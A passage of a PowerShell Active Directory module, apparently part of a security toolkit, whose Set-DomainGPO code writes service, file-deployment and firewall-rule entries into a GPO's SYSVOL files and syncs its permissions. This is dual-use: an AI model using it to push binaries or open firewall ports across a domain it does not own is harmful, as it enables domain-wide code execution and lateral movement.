                        $machineExtensions = "[{00000000-0000-0000-0000-000000000000}{7150F9BF-48AD-4DA4-A49C-29EF4A8369BA}][{AADCED64-746C-4633-A97C-D61349046527}{7150F9BF-48AD-4DA4-A49C-29EF4A8369BA}]"

                        # Use Invoke-SMBAccess to create Services.xml
                        $smbResult = Invoke-SMBAccess -Description "Create GPO Service" -ErrorHandling Stop -ScriptBlock {
                            param($basePath)

                            $gpoBasePath = Join-Path $basePath "$domainName\Policies\$gpoGuid"
                            $preferencesPath = Join-Path $gpoBasePath "Machine\Preferences\Services"

                            if (-not (Test-Path $gpoBasePath)) {
                                throw "SYSVOL folder not found: $gpoBasePath"
                            }

                            # Create folder structure
                            if (-not (Test-Path $preferencesPath)) {
                                $null = New-Item -Path $preferencesPath -ItemType Directory -Force -ErrorAction Stop
                            }

                            $servicesXmlPath = Join-Path $preferencesPath "Services.xml"

                            # Service entry XML fragment (used for both create and append)
                            $serviceEntryXml = @"
    <NTService clsid="{AB6F0B67-341F-4B85-86D6-CF13C8E03C7E}" name="$svcNameVal" image="0" changed="$timestampVal" uid="$itemUIDVal" userContext="0" removePolicy="0">
        <Properties startupType="$startupTypeVal" serviceName="$svcNameVal" serviceType="SERVICE_WIN32_OWN_PROCESS" serviceAction="C" timeout="30" accountName="$accountVal" firstFailure="RUNCMD" secondFailure="RUNCMD" thirdFailure="RUNCMD" resetFailCountDelay="0" restartComputerDelay="60000" program="" args="" workingDir="">
            <Program path="$binaryPathVal" displayName="$svcDisplayVal" description="" />
        </Properties>
    </NTService>
"@

                            # Create or update Services.xml
                            if (Test-Path $servicesXmlPath) {
                                # Append to existing file using XmlDocument for robust parsing
                                [xml]$xmlDoc = Get-Content -Path $servicesXmlPath -Raw
                                $fragment = $xmlDoc.CreateDocumentFragment()
                                $fragment.InnerXml = $serviceEntryXml
                                $xmlDoc.NTServices.AppendChild($fragment) | Out-Null
                                $xmlDoc.Save($servicesXmlPath)
                            } else {
                                # Create new file
                                $newContent = @"
<?xml version="1.0" encoding="UTF-8"?>
<NTServices clsid="{2CFB484A-4E96-4B5D-A0B6-093D2F91E6AE}">
$serviceEntryXml
</NTServices>
"@
                                Set-Content -Path $servicesXmlPath -Value $newContent -Encoding UTF8 -Force -ErrorAction Stop
                            }

                            Write-Log "[Set-DomainGPO] Created service configuration at: $servicesXmlPath"

                            return @{
                                Success = $true
                                ServicesXmlPath = $servicesXmlPath
                            }
                        }.GetNewClosure()

                        if (-not $smbResult -or -not $smbResult.Success) {
                            throw "Failed to create Service via SMB"
                        }

                        # Update GPO machine extensions in AD
                        $gpoResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$GPODN)" -Properties @('gPCMachineExtensionNames') -SizeLimit 1)[0]
                        $currentExtensions = if ($gpoResult -and $gpoResult.gPCMachineExtensionNames) { $gpoResult.gPCMachineExtensionNames } else { $null }
                        if (-not $currentExtensions -or $currentExtensions -notmatch '7150F9BF-48AD-4DA4-A49C-29EF4A8369BA') {
                            $newExtensions = if ($currentExtensions) { $currentExtensions + $machineExtensions } else { $machineExtensions }
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $GPODN
                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "gPCMachineExtensionNames"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add($newExtensions) | Out-Null
                            $ModifyRequest.Modifications.Add($Modification) | Out-Null
                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }
                            Write-Log "[Set-DomainGPO] Updated gPCMachineExtensionNames with Services extension"
                        }

                        # Increment GPO version
                        $versionResult = Update-GPOVersion -GPODN $GPODN -GPOName $GPOName -Credential $Credential -IncrementMachine
                        if (-not $versionResult.Success) {
                            Write-Warning "[Set-DomainGPO] GPO version increment failed: $($versionResult.Message)"
                        }

                        if ($PassThru) {
                            return [PSCustomObject]@{
                                Operation = "AddService"
                                GPO = $GPOName
                                GPOGUID = $GPOGUID
                                ServiceName = $ServiceName
                                DisplayName = $svcDisplayName
                                BinaryPath = $BinaryPath
                                StartType = $StartType
                                ServiceAccount = $ServiceAccount
                                NewVersion = $versionResult.NewVersion
                                Success = $true
                                Message = "Service added successfully"
                            }
                        } else {
                            Show-Line "Successfully added Service to GPO '$GPOName'" -Class Hint
                            Show-KeyValue "Service Name:" $ServiceName
                            Show-KeyValue "Display Name:" $svcDisplayName
                            Show-KeyValue "Binary Path:" $BinaryPath
                            Show-KeyValue "Start Type:" $StartType
                            Show-KeyValue "Account:" $ServiceAccount
                            Show-KeyValue "GPO Version:" $versionResult.NewVersion
                        }

                    } catch {
                        throw "Failed to add Service: $_"
                    }
                }

                'DeployFile' {
                    Write-Log "[Set-DomainGPO] Deploying file via GPO: $GPOName"

                    try {
                        # Extract GPO GUID
                        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
                        if (-not $GPOGUID) {
                            throw "Could not extract GUID from GPO DN: $GPODN"
                        }

                        # Map FileAction to GPP action values
                        $actionValue = switch ($FileAction) {
                            'Create'  { "C" }
                            'Replace' { "R" }
                            'Update'  { "U" }
                            'Delete'  { "D" }
                            default   { "C" }
                        }

                        # Generate unique UID for the file item
                        $itemUID = "{" + [guid]::NewGuid().ToString().ToUpper() + "}"

                        # Current timestamp
                        $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

                        # Determine if source is UNC or local
                        $isUNC = $SourceFile -match '^\\\\' -or $SourceFile -match '^//'

                        # Prepare variables for closure (XML-escaped to prevent injection)
                        $domainName = $Script:LDAPContext.Domain
                        $gpoGuid = $GPOGUID
                        $sourceFileVal = $SourceFile  # Not escaped - used for file operations
                        $destPathVal = [System.Security.SecurityElement]::Escape($DestinationPath)
                        $actionVal = $actionValue
                        $itemUIDVal = $itemUID
                        $timestampVal = $timestamp
                        $isUNCVal = $isUNC

                        # CLSID for Files GPP extension
                        $machineExtensions = "[{00000000-0000-0000-0000-000000000000}{3BAE7E51-E3F4-41D0-853D-AEB06EFFDBE1}][{AADCED64-746C-4633-A97C-D61349046527}{3BAE7E51-E3F4-41D0-853D-AEB06EFFDBE1}]"

                        # Use Invoke-SMBAccess to create Files.xml
                        $smbResult = Invoke-SMBAccess -Description "Create GPO File Deployment" -ErrorHandling Stop -ScriptBlock {
                            param($basePath)

                            $gpoBasePath = Join-Path $basePath "$domainName\Policies\$gpoGuid"
                            $preferencesPath = Join-Path $gpoBasePath "Machine\Preferences\Files"

                            if (-not (Test-Path $gpoBasePath)) {
                                throw "SYSVOL folder not found: $gpoBasePath"
                            }

                            # Create folder structure
                            if (-not (Test-Path $preferencesPath)) {
                                $null = New-Item -Path $preferencesPath -ItemType Directory -Force -ErrorAction Stop
                            }

                            $filesXmlPath = Join-Path $preferencesPath "Files.xml"

                            # Determine fromPath - if local file, need to read and embed or reference from SYSVOL
                            $fromPath = $sourceFileVal
                            if (-not $isUNCVal -and (Test-Path $sourceFileVal)) {
                                # Copy file to SYSVOL and reference from there
                                $fileName = Split-Path $sourceFileVal -Leaf
                                $sysvolFilePath = Join-Path $preferencesPath $fileName
                                Copy-Item -Path $sourceFileVal -Destination $sysvolFilePath -Force -ErrorAction Stop
                                $fromPath = "\\$domainName\SYSVOL\$domainName\Policies\$gpoGuid\Machine\Preferences\Files\$fileName"
                                Write-Log "[Set-DomainGPO] Copied source file to SYSVOL: $sysvolFilePath"
                            }

                            # XML-escape the fromPath for safe embedding
                            $fromPathEscaped = [System.Security.SecurityElement]::Escape($fromPath)
                            # Note: GetFileName on already-escaped path would double-escape, so use original DestinationPath
                            $fileNameEscaped = [System.Security.SecurityElement]::Escape([System.IO.Path]::GetFileName($DestinationPath))

                            # File entry XML fragment (used for both create and append)
                            $fileEntryXml = @"
    <File clsid="{50BE44C8-567A-4ED1-B1D0-9234FE1F38AF}" name="$fileNameEscaped" status="$fileNameEscaped" image="0" changed="$timestampVal" uid="$itemUIDVal" userContext="0" removePolicy="0">
        <Properties action="$actionVal" fromPath="$fromPathEscaped" targetPath="$destPathVal" readOnly="0" archive="1" hidden="0" suppress="0" />
    </File>
"@

                            # Create or update Files.xml
                            if (Test-Path $filesXmlPath) {
                                # Append to existing file using XmlDocument for robust parsing
                                [xml]$xmlDoc = Get-Content -Path $filesXmlPath -Raw
                                $fragment = $xmlDoc.CreateDocumentFragment()
                                $fragment.InnerXml = $fileEntryXml
                                $xmlDoc.Files.AppendChild($fragment) | Out-Null
                                $xmlDoc.Save($filesXmlPath)
                            } else {
                                # Create new file
                                $newContent = @"
<?xml version="1.0" encoding="UTF-8"?>
<Files clsid="{215B2E53-57CE-475c-80FE-9EEC14635851}">
$fileEntryXml
</Files>
"@
                                Set-Content -Path $filesXmlPath -Value $newContent -Encoding UTF8 -Force -ErrorAction Stop
                            }

                            Write-Log "[Set-DomainGPO] Created file deployment at: $filesXmlPath"

                            return @{
                                Success = $true
                                FilesXmlPath = $filesXmlPath
                                FromPath = $fromPath
                            }
                        }.GetNewClosure()

                        if (-not $smbResult -or -not $smbResult.Success) {
                            throw "Failed to deploy file via SMB"
                        }

                        # Update GPO machine extensions in AD
                        $gpoResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$GPODN)" -Properties @('gPCMachineExtensionNames') -SizeLimit 1)[0]
                        $currentExtensions = if ($gpoResult -and $gpoResult.gPCMachineExtensionNames) { $gpoResult.gPCMachineExtensionNames } else { $null }
                        if (-not $currentExtensions -or $currentExtensions -notmatch '3BAE7E51-E3F4-41D0-853D-AEB06EFFDBE1') {
                            $newExtensions = if ($currentExtensions) { $currentExtensions + $machineExtensions } else { $machineExtensions }
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $GPODN
                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "gPCMachineExtensionNames"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add($newExtensions) | Out-Null
                            $ModifyRequest.Modifications.Add($Modification) | Out-Null
                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }
                            Write-Log "[Set-DomainGPO] Updated gPCMachineExtensionNames with Files extension"
                        }

                        # Increment GPO version
                        $versionResult = Update-GPOVersion -GPODN $GPODN -GPOName $GPOName -Credential $Credential -IncrementMachine
                        if (-not $versionResult.Success) {
                            Write-Warning "[Set-DomainGPO] GPO version increment failed: $($versionResult.Message)"
                        }

                        if ($PassThru) {
                            return [PSCustomObject]@{
                                Operation = "DeployFile"
                                GPO = $GPOName
                                GPOGUID = $GPOGUID
                                SourceFile = $SourceFile
                                DestinationPath = $DestinationPath
                                FromPath = $smbResult.FromPath
                                Action = $FileAction
                                NewVersion = $versionResult.NewVersion
                                Success = $true
                                Message = "File deployment added successfully"
                            }
                        } else {
                            Show-Line "Successfully added File Deployment to GPO '$GPOName'" -Class Hint
                            Show-KeyValue "Source:" $SourceFile
                            Show-KeyValue "Destination:" $DestinationPath
                            Show-KeyValue "Action:" $FileAction
                            Show-KeyValue "GPO Version:" $versionResult.NewVersion
                        }

                    } catch {
                        throw "Failed to deploy file: $_"
                    }
                }

                'AddFirewallRule' {
                    Write-Log "[Set-DomainGPO] Adding Firewall Rule to GPO: $GPOName"

                    try {
                        # Extract GPO GUID
                        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
                        if (-not $GPOGUID) {
                            throw "Could not extract GUID from GPO DN: $GPODN"
                        }

                        # Map direction to registry value
                        $dirValue = if ($RuleDirection -eq 'Inbound') { "1" } else { "2" }

                        # Map action to registry value
                        $actValue = if ($RuleAction -eq 'Allow') { "2" } else { "0" }

                        # Map protocol to registry value
                        $protValue = switch ($RuleProtocol) {
                            'TCP' { "6" }
                            'UDP' { "17" }
                            'Any' { "256" }
                            default { "6" }
                        }

                        # Generate unique UID for the rule
                        $ruleUID = "{" + [guid]::NewGuid().ToString().ToUpper() + "}"

                        # Current timestamp
                        $timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")

                        # Prepare variables for closure (XML-escaped to prevent injection)
                        $domainName = $Script:LDAPContext.Domain
                        $gpoGuid = $GPOGUID
                        $ruleNameVal = [System.Security.SecurityElement]::Escape($RuleName)
                        $dirVal = $dirValue
                        $actVal = $actValue
                        $protVal = $protValue
                        $localPortVal = if ($RuleLocalPort) { [System.Security.SecurityElement]::Escape($RuleLocalPort) } else { "" }
                        $remotePortVal = if ($RuleRemotePort) { [System.Security.SecurityElement]::Escape($RuleRemotePort) } else { "" }
                        $remoteAddrVal = if ($RuleRemoteAddress -eq 'Any') { "*" } else { [System.Security.SecurityElement]::Escape($RuleRemoteAddress) }
                        $programVal = if ($RuleProgram) { [System.Security.SecurityElement]::Escape($RuleProgram) } else { "" }
                        $ruleUIDVal = $ruleUID
                        $timestampVal = $timestamp

                        # CSE GUIDs for Group Policy Preferences - Windows Firewall
                        # {00000000-0000-0000-0000-000000000000} - Core GP Engine (ensures processing at computer startup)
                        # {AADCED64-746C-4633-A97C-D61349046527} - GPP Core CSE (Client-Side Extension)
                        # {6A4C88C6-C502-4f74-8F60-2CB23EDC24E2} - GPP Firewall CSE (tool extension)
                        $machineExtensions = "[{00000000-0000-0000-0000-000000000000}{6A4C88C6-C502-4f74-8F60-2CB23EDC24E2}][{AADCED64-746C-4633-A97C-D61349046527}{6A4C88C6-C502-4f74-8F60-2CB23EDC24E2}]"

                        # Use Invoke-SMBAccess to create firewall rule via GPP WindowsFirewall.xml
                        $smbResult = Invoke-SMBAccess -Description "Create GPO Firewall Rule" -ErrorHandling Stop -ScriptBlock {
                            param($basePath)

                            $gpoBasePath = Join-Path $basePath "$domainName\Policies\$gpoGuid"

                            if (-not (Test-Path $gpoBasePath)) {
                                throw "SYSVOL folder not found: $gpoBasePath"
                            }

                            # Use Group Policy Preferences Firewall (WFAS)
                            $preferencesPath = Join-Path $gpoBasePath "Machine\Preferences\WindowsFirewall"

                            # Create folder structure
                            if (-not (Test-Path $preferencesPath)) {
                                $null = New-Item -Path $preferencesPath -ItemType Directory -Force -ErrorAction Stop
                            }

                            $firewallXmlPath = Join-Path $preferencesPath "WindowsFirewall.xml"

                            # Build rule direction for XML element name
                            $ruleDirection = if ($dirVal -eq "1") { "In" } else { "Out" }

                            # Firewall rule entry XML fragment (used for both create and append)
                            $ruleEntryXml = @"
        <$($ruleDirection)boundRule clsid="{4DAB7AA8-C1E7-4716-BA2E-42B29C61AE5B}" name="$ruleNameVal" image="0" changed="$timestampVal" uid="$ruleUIDVal" disabled="0" userContext="0" removePolicy="0">
            <Properties name="$ruleNameVal" desc="" appPath="$programVal" svcName="" protocol="$protVal" lPort="$localPortVal" rPort="$remotePortVal" lAddr="" rAddr="$remoteAddrVal" lAddr2_6="" rAddr2_6="" action="$actVal" dir="$dirVal" active="1" defer="0" edgeTraversal="0" lPortMap="" rPortMap="" />
        </$($ruleDirection)boundRule>
"@

                            # Create or update WindowsFirewall.xml (GPP format)
                            if (Test-Path $firewallXmlPath) {
                                # Append to existing file using XmlDocument for robust parsing
                                [xml]$xmlDoc = Get-Content -Path $firewallXmlPath -Raw
                                $fragment = $xmlDoc.CreateDocumentFragment()
                                $fragment.InnerXml = $ruleEntryXml
                                $xmlDoc.WindowsFirewall.FirewallRules.AppendChild($fragment) | Out-Null
                                $xmlDoc.Save($firewallXmlPath)
                            } else {
                                # Create new file
                                $newContent = @"
<?xml version="1.0" encoding="UTF-8"?>
<WindowsFirewall clsid="{57C84C13-D12F-4B3D-94CB-B5926F861A32}">
    <FirewallRules clsid="{E184E6BA-D8A7-4874-A7CE-1D5ED1226A2A}">
$ruleEntryXml
    </FirewallRules>
</WindowsFirewall>
"@
                                Set-Content -Path $firewallXmlPath -Value $newContent -Encoding UTF8 -Force -ErrorAction Stop
                            }

                            Write-Log "[Set-DomainGPO] Created firewall rule at: $firewallXmlPath"

                            return @{
                                Success = $true
                                FirewallXmlPath = $firewallXmlPath
                            }
                        }.GetNewClosure()

                        if (-not $smbResult -or -not $smbResult.Success) {
                            throw "Failed to create Firewall Rule via SMB"
                        }

                        # Update GPO machine extensions in AD (GPP Firewall CSE)
                        $gpoResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$GPODN)" -Properties @('gPCMachineExtensionNames') -SizeLimit 1)[0]
                        $currentExtensions = if ($gpoResult -and $gpoResult.gPCMachineExtensionNames) { $gpoResult.gPCMachineExtensionNames } else { $null }
                        if (-not $currentExtensions -or $currentExtensions -notmatch '6A4C88C6-C502-4f74-8F60-2CB23EDC24E2') {
                            $newExtensions = if ($currentExtensions) { $currentExtensions + $machineExtensions } else { $machineExtensions }
                            $ModifyRequest = New-Object System.DirectoryServices.Protocols.ModifyRequest
                            $ModifyRequest.DistinguishedName = $GPODN
                            $Modification = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
                            $Modification.Name = "gPCMachineExtensionNames"
                            $Modification.Operation = [System.DirectoryServices.Protocols.DirectoryAttributeOperation]::Replace
                            $Modification.Add($newExtensions) | Out-Null
                            $ModifyRequest.Modifications.Add($Modification) | Out-Null
                            $Response = $Script:LdapConnection.SendRequest($ModifyRequest)
                            if ($Response.ResultCode -ne [System.DirectoryServices.Protocols.ResultCode]::Success) {
                                throw "LDAP ModifyRequest failed: $($Response.ResultCode) - $($Response.ErrorMessage)"
                            }
                            Write-Log "[Set-DomainGPO] Updated gPCMachineExtensionNames with GPP Firewall extension"
                        }

                        # Increment GPO version
                        $versionResult = Update-GPOVersion -GPODN $GPODN -GPOName $GPOName -Credential $Credential -IncrementMachine
                        if (-not $versionResult.Success) {
                            Write-Warning "[Set-DomainGPO] GPO version increment failed: $($versionResult.Message)"
                        }

                        if ($PassThru) {
                            return [PSCustomObject]@{
                                Operation = "AddFirewallRule"
                                GPO = $GPOName
                                GPOGUID = $GPOGUID
                                RuleName = $RuleName
                                Direction = $RuleDirection
                                Action = $RuleAction
                                Protocol = $RuleProtocol
                                LocalPort = $RuleLocalPort
                                RemotePort = $RuleRemotePort
                                RemoteAddress = $RuleRemoteAddress
                                Program = $RuleProgram
                                NewVersion = $versionResult.NewVersion
                                Success = $true
                                Message = "Firewall rule added successfully"
                            }
                        } else {
                            Show-Line "Successfully added Firewall Rule to GPO '$GPOName'" -Class Hint
                            Show-KeyValue "Rule Name:" $RuleName
                            Show-KeyValue "Direction:" $RuleDirection
                            Show-KeyValue "Action:" $RuleAction
                            Show-KeyValue "Protocol:" $RuleProtocol
                            if ($RuleLocalPort) { Show-KeyValue "Local Port:" $RuleLocalPort }
                            if ($RuleRemotePort) { Show-KeyValue "Remote Port:" $RuleRemotePort }
                            if ($RuleRemoteAddress -ne 'Any') { Show-KeyValue "Remote Address:" $RuleRemoteAddress }
                            if ($RuleProgram) { Show-KeyValue "Program:" $RuleProgram }
                            Show-KeyValue "GPO Version:" $versionResult.NewVersion
                        }

                    } catch {
                        throw "Failed to add Firewall Rule: $_"
                    }
                }
            }

            # Auto-sync SYSVOL for SetOwner and GrantRights (unless -NoSYSVOL is specified)
            if ($PSCmdlet.ParameterSetName -in @('SetOwner', 'GrantRights') -and -not $NoSYSVOL) {
                Write-Log "[Set-DomainGPO] Auto-syncing SYSVOL permissions after $($PSCmdlet.ParameterSetName)..."

                $syncResult = Sync-GPOSYSVOLPermissions -GPODN $GPODN -GPOName $GPOName -Credential $Credential

                # Update result object with SYSVOL sync status
                if ($PSCmdlet.ParameterSetName -eq 'SetOwner' -and $Script:_SetOwnerResult) {
                    $Script:_SetOwnerResult.SYSVOLSynced = $syncResult.Success
                    if (-not $syncResult.Success) {
                        $Script:_SetOwnerResult.Message = "Owner changed but SYSVOL sync failed: $($syncResult.Message)"
                    }
                } elseif ($PSCmdlet.ParameterSetName -eq 'GrantRights' -and $Script:_GrantRightsResult) {
                    $Script:_GrantRightsResult.SYSVOLSynced = $syncResult.Success
                    if (-not $syncResult.Success) {
                        $Script:_GrantRightsResult.Message = "Rights granted but SYSVOL sync failed: $($syncResult.Message)"
                    }
                }

                if ($syncResult.Success) {
                    if (-not $PassThru) {
                        Show-Line "SYSVOL permissions synchronized automatically" -Class Hint
                    }
                } else {
                    if (-not $PassThru) {
                        Write-Warning "[Set-DomainGPO] SYSVOL auto-sync failed: $($syncResult.Message)"
                        Write-Warning "    Use -NoSYSVOL to skip SYSVOL sync, or fix manually with: Set-DomainGPO -Identity '$GPOName' -SyncSYSVOL"
                    }
                }
            } elseif ($PSCmdlet.ParameterSetName -in @('SetOwner', 'GrantRights') -and $NoSYSVOL) {
                # NoSYSVOL flag set - mark as skipped
                if ($PSCmdlet.ParameterSetName -eq 'SetOwner' -and $Script:_SetOwnerResult) {
                    $Script:_SetOwnerResult.SYSVOLSynced = $false
                    $Script:_SetOwnerResult.Message = "Owner changed (SYSVOL sync skipped via -NoSYSVOL)"
                } elseif ($PSCmdlet.ParameterSetName -eq 'GrantRights' -and $Script:_GrantRightsResult) {
                    $Script:_GrantRightsResult.SYSVOLSynced = $false
                    $Script:_GrantRightsResult.Message = "Rights granted (SYSVOL sync skipped via -NoSYSVOL)"
                }
            }

            # Return PassThru result for SetOwner/GrantRights (after SYSVOL sync)
            if ($PassThru -and $PSCmdlet.ParameterSetName -eq 'SetOwner' -and $Script:_SetOwnerResult) {
                $resultToReturn = $Script:_SetOwnerResult
                $Script:_SetOwnerResult = $null  # Clean up Script-scope variable
                return $resultToReturn
            } elseif ($PassThru -and $PSCmdlet.ParameterSetName -eq 'GrantRights' -and $Script:_GrantRightsResult) {
                $resultToReturn = $Script:_GrantRightsResult
                $Script:_GrantRightsResult = $null  # Clean up Script-scope variable
                return $resultToReturn
            }

        } catch {
            Write-Log "[Set-DomainGPO] Error: $_"

            if ($PassThru) {
                return [PSCustomObject]@{
                    Operation = $PSCmdlet.ParameterSetName
                    GPO = $Identity
                    Success = $false
                    Message = $_.Exception.Message
                }
            } else {
                Write-Error "[Set-DomainGPO] $($_.Exception.Message)"
            }
        }
    }

    end {
        # Clean up Script-scope variables (in case not already cleaned by PassThru return)
        $Script:_SetOwnerResult = $null
        $Script:_GrantRightsResult = $null
        Write-Log "[Set-DomainGPO] GPO modification completed"
    }
}

# Internal helper function for SYSVOL permission synchronization
function Sync-GPOSYSVOLPermissions {
    <#
    .SYNOPSIS
        Internal helper to synchronize AD GPO permissions to SYSVOL folder.
    .DESCRIPTION
        Reads AD object ACLs and mirrors them to SYSVOL folder.
        Maps AD rights to NTFS rights for GPMC compatibility.
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$true)]
        [string]$GPODN,

        [Parameter(Mandatory=$true)]
        [string]$GPOName,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential
    )

    try {
        Write-Log "[Sync-GPOSYSVOLPermissions] Starting SYSVOL sync for: $GPOName"

        # Extract GUID from GPO DN
        $GPOGUID = if ($GPODN -match 'CN=(\{[0-9A-Fa-f\-]{36}\})') { $Matches[1] } else { $null }
        if (-not $GPOGUID) {
            return [PSCustomObject]@{
                Operation = "SyncSYSVOL"
                GPO = $GPOName
                Success = $false
                Message = "Could not extract GUID from GPO DN: $GPODN"
            }
        }

        # Read AD object ACLs via Invoke-LDAPSearch -Raw
        Write-Log "[Sync-GPOSYSVOLPermissions] Reading AD ACLs from: $GPODN"
        $ADACEs = $null
        $ADOwner = $null

        $SDResult = @(Invoke-LDAPSearch -Filter "(distinguishedName=$GPODN)" -Properties @('nTSecurityDescriptor') -SizeLimit 1 -Raw)[0]
        if (-not $SDResult -or -not $SDResult.nTSecurityDescriptor) {
            throw "Could not read security descriptor from GPO: $GPODN"
        }
        $SDBytes = [byte[]]($SDResult.nTSecurityDescriptor)
        $ADSecurityDescriptor = New-Object System.DirectoryServices.ActiveDirectorySecurity
        $ADSecurityDescriptor.SetSecurityDescriptorBinaryForm($SDBytes)

        # Extract ACEs and Owner
        $ADACEs = $ADSecurityDescriptor.GetAccessRules($true, $false, [System.Security.Principal.SecurityIdentifier])
        $ADOwner = $ADSecurityDescriptor.GetOwner([System.Security.Principal.SecurityIdentifier])

        # Map AD rights to NTFS rights
        # Only map non-object-specific ACEs (ObjectType = empty GUID means "applies to entire object")
        # Object-specific ACEs (e.g., WriteProperty on a specific AD attribute) should NOT grant
        # broad NTFS rights on SYSVOL folders.
        #
        # AD Rights constants:
        # - 0xF01FF = GenericAll (Full Control)
        # - 0xF00FF = Full Control minus Delete
        # - 0x20094 = GenericRead (Read + ListChildren + ReadProperty)
        # - 0x20028 = GenericWrite (Self + WriteProperty + CreateChild)
        # - 0x100 = ExtendedRight (used for "Apply Group Policy")
        $emptyGuid = [System.Guid]::Empty
        $SYSVOLACEData = @()
        foreach ($ADACE in $ADACEs) {
            # Skip object-specific ACEs — they grant rights only on specific AD attributes/properties
            # and should not be mapped to NTFS permissions (would grant overly broad SYSVOL access)
            if ($ADACE.ObjectType -ne $emptyGuid) {
                Write-Log "[Sync-GPOSYSVOLPermissions] Skipping object-specific ACE: Trustee=$($ADACE.IdentityReference.Value), ObjectType=$($ADACE.ObjectType)"
                continue
            }

            $TrusteeSID = $ADACE.IdentityReference.Value
            $ADRights = [int]$ADACE.ActiveDirectoryRights
            $AccessType = $ADACE.AccessControlType

            $NTFSRights = [System.Security.AccessControl.FileSystemRights]::None

            # Full Control: ADRights >= 0xF0000 indicates management access
            if ($ADRights -ge 0xF0000) {
                $NTFSRights = [System.Security.AccessControl.FileSystemRights]::FullControl
            }
            # Write/Modify: GenericWrite (0x20028) or WriteProperty with Delete
            elseif (($ADRights -band 0x20028) -eq 0x20028 -or (($ADRights -band 0x20) -eq 0x20 -and ($ADRights -band 0x10000) -ne 0)) {
                $NTFSRights = [System.Security.AccessControl.FileSystemRights]::Modify
            }
            # Read: GenericRead (0x20094) or ExtendedRight (0x100) = Apply GPO = Read on SYSVOL
            else {
                $NTFSRights = [System.Security.AccessControl.FileSystemRights]::ReadAndExecute
            }

            Write-Log "[Sync-GPOSYSVOLPermissions] Mapped: Trustee=$TrusteeSID, ADRights=0x$($ADRights.ToString('X')) -> NTFSRights=$NTFSRights"

            $SYSVOLACEData += @{
                TrusteeSID = $TrusteeSID
                NTFSRights = $NTFSRights
                AccessType = $AccessType
            }
        }

        # Consolidate ACEs: Keep highest privilege per trustee
        $ConsolidatedACEs = @{}
        foreach ($ace in $SYSVOLACEData) {
            $key = "$($ace.TrusteeSID)|$($ace.AccessType)"
            if ($ConsolidatedACEs.ContainsKey($key)) {
                $existing = $ConsolidatedACEs[$key]
                if ([int]$ace.NTFSRights -gt [int]$existing.NTFSRights) {
                    $ConsolidatedACEs[$key] = $ace
                }
            } else {
                $ConsolidatedACEs[$key] = $ace
            }
        }
        $SYSVOLACEData = @($ConsolidatedACEs.Values)
        Write-Log "[Sync-GPOSYSVOLPermissions] Consolidated to $($SYSVOLACEData.Count) unique ACEs"

        # Prepare closure variables
        $domainName = $Script:LDAPContext.Domain
        $gpoGuid = $GPOGUID
        $ownerSID = $ADOwner.Value

        # Use Invoke-SMBAccess for authenticated SYSVOL access
        $smbResult = Invoke-SMBAccess -Description "Sync GPO SYSVOL permissions" -ErrorHandling Stop -ScriptBlock {
            param($basePath)

            $gpoBasePath = Join-Path $basePath "$domainName\Policies\$gpoGuid"

            if (-not (Test-Path $gpoBasePath)) {
                throw "SYSVOL folder not found: $gpoBasePath"
            }

            Write-Log "[Sync-GPOSYSVOLPermissions] Updating ACLs on: $gpoBasePath"

            $acl = Get-Acl -Path $gpoBasePath

            # Disable inheritance and clear existing rules
            $acl.SetAccessRuleProtection($true, $false)
            $acl.Access | ForEach-Object { $acl.RemoveAccessRule($_) | Out-Null }

            # Set owner to match AD object
            try {
                $ownerIdentity = New-Object System.Security.Principal.SecurityIdentifier($ownerSID)
                $acl.SetOwner($ownerIdentity)
                Write-Log "[Sync-GPOSYSVOLPermissions] Set owner to: $ownerSID"
            } catch {
                Write-Log "[Sync-GPOSYSVOLPermissions] Warning: Could not set owner: $_"
            }

            # Apply mirrored ACEs
            foreach ($aceData in $SYSVOLACEData) {
                try {
                    $sid = New-Object System.Security.Principal.SecurityIdentifier($aceData.TrusteeSID)
                    $rule = New-Object System.Security.AccessControl.FileSystemAccessRule(
                        $sid,
                        $aceData.NTFSRights,
                        ([System.Security.AccessControl.InheritanceFlags]::ContainerInherit -bor [System.Security.AccessControl.InheritanceFlags]::ObjectInherit),
                        [System.Security.AccessControl.PropagationFlags]::None,
                        $aceData.AccessType
                    )
                    $acl.AddAccessRule($rule)
                    Write-Log "[Sync-GPOSYSVOLPermissions] Added ACE: $($aceData.TrusteeSID) = $($aceData.NTFSRights)"
                } catch {
                    Write-Log "[Sync-GPOSYSVOLPermissions] Warning: Could not add ACE for $($aceData.TrusteeSID): $_"
                }
            }

            # Apply ACL to GPO root folder (inheritance disabled, explicit ACEs with ContainerInherit|ObjectInherit)
            Set-Acl -Path $gpoBasePath -AclObject $acl -ErrorAction Stop

            # Enable inheritance on subfolders so they inherit from the GPO root
            # The root ACEs have ContainerInherit|ObjectInherit flags, so children inherit automatically
            foreach ($subPath in @((Join-Path $gpoBasePath "Machine"), (Join-Path $gpoBasePath "User"))) {
